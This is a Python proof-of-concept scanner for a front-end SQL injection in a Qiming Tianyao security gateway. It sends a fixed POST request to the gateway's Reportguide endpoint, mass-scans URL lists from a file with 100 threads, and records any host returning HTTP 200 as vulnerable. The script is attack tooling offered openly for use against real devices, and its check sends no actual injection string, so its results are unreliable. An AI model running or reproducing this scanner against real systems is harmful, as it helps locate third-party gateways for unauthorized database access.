# 启明天钥安全网关前台sql注入

import requests, sys, argparse, re, json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """

                     ██████╗ ██╗███╗   ███╗██╗███╗   ██╗ ██████╗ 
                    ██╔═══██╗██║████╗ ████║██║████╗  ██║██╔════╝ 
                    ██║   ██║██║██╔████╔██║██║██╔██╗ ██║██║  ███╗
                    ██║▄▄ ██║██║██║╚██╔╝██║██║██║╚██╗██║██║   ██║
                    ╚██████╔╝██║██║ ╚═╝ ██║██║██║ ╚████║╚██████╔╝
                     ╚══▀▀═╝ ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝
                                                                    author:wAw
                                                                    time:2024.9.26
                                                                    version:1.0

 """
    print(test)


def poc(target):
    payload = "/ops/index.php?c=Reportguide&a=checkrn"

    headers = {
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="88","GoogleChrome";v="88",";NotABrand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/88.0.4324.96Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '39'

    }
    data = 'checkname=123&tagid=123'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target + payload, headers=headers, data=data, verify=False)

        if res1.status_code == 200:
            print(f"[+]目标存在 {target}")
            with open('启明_result.txt', 'a') as f:
                f.write(target + '\n')
        else:
            print(f'[-]目标不存在漏洞 {target}')
    except Exception as e:
        print(e)


def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()